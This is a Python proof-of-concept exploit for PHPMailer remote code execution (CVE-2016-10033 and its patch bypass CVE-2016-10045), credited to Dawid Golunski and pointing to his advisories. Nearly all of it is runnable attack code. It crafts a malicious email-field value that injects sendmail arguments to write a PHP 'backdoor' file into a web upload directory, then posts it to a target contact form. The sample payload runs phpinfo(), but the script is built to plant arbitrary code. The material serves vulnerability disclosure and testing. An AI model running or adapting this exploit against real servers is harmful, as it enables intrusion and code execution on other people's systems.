#!/usr/bin/python3

#PHPMailer_RCE_exploit.py

import requests
import argparse
import sys

intro = """
PHPMailer RCE PoC Exploits

PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
+
PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
(the bypass of the first patch for CVE-2016-10033)

Discovered and Coded by:

 Dawid Golunski
 @dawid_golunski
 https://legalhackers.com

"""

usage = """
Usage:

Full Advisory:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html

https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.txt

PoC Video:
https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html

Disclaimer:
For testing purposes only. Do no harm.

"""

def main(url, proxy=None):
    RW_DIR = "/var/www/html/uploads"

    # Choose/uncomment one of the payloads:

    # PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
    #payload = '"attacker\\" -oQ/tmp/ -X%s/phpcode.php  some"@email.com' % RW_DIR

    # Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
    payload = "\"attacker\\' -oQ/tmp/ -X%s/phpcode.php  some\"@email.com" % RW_DIR

    ######################################

    # PHP code to be saved into the backdoor php file on the target in RW_DIR
    RCE_PHP_CODE = "<?php phpinfo(); ?>"

    post_fields = {
        'action': 'send',
        'name': 'Jas Fasola',
        'email': payload,
        'msg': RCE_PHP_CODE
    }

    # Setup proxy if provided
    proxies = {
        'http': proxy,
        'https': proxy
    } if proxy else None

    # Attack
    try:
        if proxies:
            response = requests.post(url, data=post_fields, proxies=proxies)
        else:
            response = requests.post(url, data=post_fields)

        the_page = response.text
        print(the_page)

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PHPMailer RCE PoC Exploit")
    parser.add_argument('--url', required=True, help="URL of the vulnerable contact form")
    parser.add_argument('--proxy', help="Proxy address (e.g., 127.0.0.1:8081)")

    args = parser.parse_args()

    print(intro)
    print(usage)

    main(args.url, args.proxy)
